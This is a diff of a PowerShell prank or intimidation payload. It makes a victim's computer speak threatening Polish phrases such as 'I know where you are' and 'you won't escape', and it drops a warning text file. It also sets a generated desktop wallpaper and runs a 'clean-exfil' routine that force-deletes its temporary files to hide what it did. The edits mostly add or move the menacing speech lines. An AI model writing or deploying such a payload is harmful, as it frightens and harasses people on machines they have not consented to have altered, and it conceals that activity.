@@ -39,10 +39,10 @@ $ImageName = "dont-be-suspicious"
 #############################################################################################################################################
 
 $s=New-Object -ComObject SAPI.SpVoice
-$s.Rate = -2
+$s.Rate = -6
 $s.Speak("Hej $FN")
-$s.Speak("Wiem juz gdzie jestes")
-$s.Speak("Nie uciekaj")
+
+
 
 
 <#
@@ -78,6 +78,7 @@ echo "Czesc! Nie mam dobrych wiadomosci dla ciebie..." $fn >> $Env:temp\foo.txt
 echo "`nTwoj komputer nie jest do konca bezpieczny" >> $Env:temp\foo.txt
 
 #############################################################################################################################################
+$s.Speak("Wiem juz gdzie jestes")
 
 <#
 
@@ -261,6 +262,7 @@ $w = [PInvoke]::GetDeviceCaps($hdc, 118) # width
 $h = [PInvoke]::GetDeviceCaps($hdc, 117) # height
 
 #############################################################################################################################################
+$s.Speak("Juz nie uciekniesz")
 
 <#
 
@@ -284,7 +286,7 @@ $bmp.Save($filename)
 # Invoke-Item $filename 
 
 #############################################################################################################################################
-
+$s.Speak("Juz nie uciekniesz")
 <#
 
 .NOTES 
@@ -299,7 +301,7 @@ rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
 
 
 #############################################################################################################################################
-
+$s.Speak("Juz nie uciekniesz")
 <#
 
 .NOTES 
@@ -384,7 +386,7 @@ public class Params
 }
 
 #----------------------------------------------------------------------------------------------------
-
+$s.Speak("Juz nie uciekniesz")
 function clean-exfil {
 
 <#
@@ -418,7 +420,7 @@ try {
 	}
 }
 #----------------------------------------------------------------------------------------------------
- 
+ $s.Speak("Juz nie uciekniesz")
 Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
 
 clean-exfil
